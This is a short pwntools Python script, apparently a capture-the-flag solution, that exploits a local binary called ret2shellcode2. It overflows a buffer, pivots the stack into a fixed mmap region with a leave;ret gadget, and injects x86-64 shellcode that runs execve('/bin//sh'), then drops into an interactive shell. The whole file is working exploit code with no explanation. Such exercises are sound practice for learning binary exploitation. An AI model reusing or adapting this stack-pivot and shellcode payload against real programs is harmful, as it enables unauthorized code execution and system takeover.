#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2shellcode2')
elf = ELF('./ret2shellcode2')

leave_ret = 0x400709
mmap_addr = 0x123900
main_puts_read = 0x4006a0

p.recvuntil("Please pwn me :)\n")
payload = 'A'*0x20 + p64(mmap_addr) + p64(main_puts_read)
#gdb.attach(p)
#pause()
p.send(payload)

p.recvuntil("Please pwn me :)\n")
shellcode = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
payload1 = p64(mmap_addr-0x18) + shellcode.ljust(0x18,'\x00') + p64(mmap_addr-0x28) + p64(leave_ret)
p.send(payload1)
p.interactive()
